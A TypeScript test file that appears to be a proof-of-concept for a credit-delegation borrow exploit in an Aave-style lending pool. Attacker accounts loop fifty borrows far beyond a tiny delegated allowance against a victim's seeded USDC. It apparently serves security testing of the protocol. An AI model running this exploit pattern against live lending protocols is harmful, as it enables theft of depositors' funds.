import {
    APPROVAL_AMOUNT_LENDING_POOL,
  } from "../../helpers/constants";
  import { convertToCurrencyDecimals, convertToCurrencyUnits } from "../../helpers/contracts-helpers";
  import { expect } from "chai";
  import { ethers } from "ethers";
  import { ProtocolErrors } from "../../helpers/types";
  import { makeSuite, TestEnv } from "./helpers/make-suite";
  import { CommonsConfig } from "../../markets/aave/commons";
  import { getVariableDebtToken } from "../../helpers/contracts-getters";
  
  const AAVE_REFERRAL = CommonsConfig.ProtocolGlobalParams.AaveReferral;
  
  makeSuite("Borrow exploit", (testEnv: TestEnv) => {
  
    it("exploit", async () => {
      const { users, pool, weth, usdc, oracle } = testEnv;
      
      var ethPrice = await oracle.getAssetPrice(weth.address)
      console.log("eth price: ", ethPrice)
  
      var usdcPrice = await oracle.getAssetPrice(usdc.address)
      console.log("usdc price: ", usdcPrice)
  
      var victims = users[0]
      var config = await pool.getReserveData(usdc.address, 0)
      var debtToken = await getVariableDebtToken(config[7])
      
      // Seed 1M in the pool.
      await usdc
      .connect(victims.signer)
      .mint(await convertToCurrencyDecimals(usdc.address, "1000000"));
  
      await usdc
        .connect(victims.signer)
        .approve(pool.address, APPROVAL_AMOUNT_LENDING_POOL);
  
      await pool
        .connect(victims.signer)
        .deposit(
          usdc.address,
          0,
          await convertToCurrencyDecimals(usdc.address, "1000000"),
          victims.address,
          "0"
        );
  
      var attackerAddress0 = users[1]
      var attackerAddress1 = users[2]
      await weth
        .connect(attackerAddress0.signer)
        .mint(await convertToCurrencyDecimals(weth.address, "10"));
  
      await weth
        .connect(attackerAddress0.signer)
        .approve(pool.address, APPROVAL_AMOUNT_LENDING_POOL);
  
      await pool
        .connect(attackerAddress0.signer)
        .deposit(
          weth.address,
          0,
          ethers.utils.parseEther("10"),
          attackerAddress0.address,
          "0"
        );
  
      await weth
        .connect(attackerAddress1.signer)
        .mint(await convertToCurrencyDecimals(weth.address, "10"));
  
      await weth
        .connect(attackerAddress1.signer)
        .approve(pool.address, APPROVAL_AMOUNT_LENDING_POOL);
  
      await pool
        .connect(attackerAddress1.signer)
        .deposit(
          weth.address,
          0,
          ethers.utils.parseEther("10"),
          attackerAddress1.address,
          "0"
        );
    console.log("Delegating debt")
      
      await debtToken
        .connect(attackerAddress1.signer)
        .approveDelegation(attackerAddress0.address, ethers.utils.parseEther("1"))
  
        console.log("Perform attack")
      for(var i=0; i<50;i++) {

        console.log("Iteration",i)
        try {
            await pool
            .connect(attackerAddress0.signer)
            .borrow(
                usdc.address,
                0,
                await convertToCurrencyDecimals(usdc.address, "2000"),
                AAVE_REFERRAL,
                attackerAddress1.address
            ); 
        } catch (e) {
            console.log("Borrow failed: ",e)
        }
        


        const vars = await pool.connect(attackerAddress1.signer).callStatic.getUserAccountData(attackerAddress1.address, 0);
        console.log("HF: ",vars.healthFactor)
        expect(Number(ethers.utils.formatUnits(vars.healthFactor,18))).to.be.gte(1)
      }
      var usdcBalance = await usdc.balanceOf(attackerAddress0.address)
      console.log("attacker balance: ", await convertToCurrencyUnits(usdc.address, usdcBalance.toString()))
      
      const vars = await pool.connect(attackerAddress1.signer).callStatic.getUserAccountData(attackerAddress1.address, 0);
       
      expect(Number(ethers.utils.formatUnits(vars.healthFactor,18))).to.be.gte(1)
    });
  });
  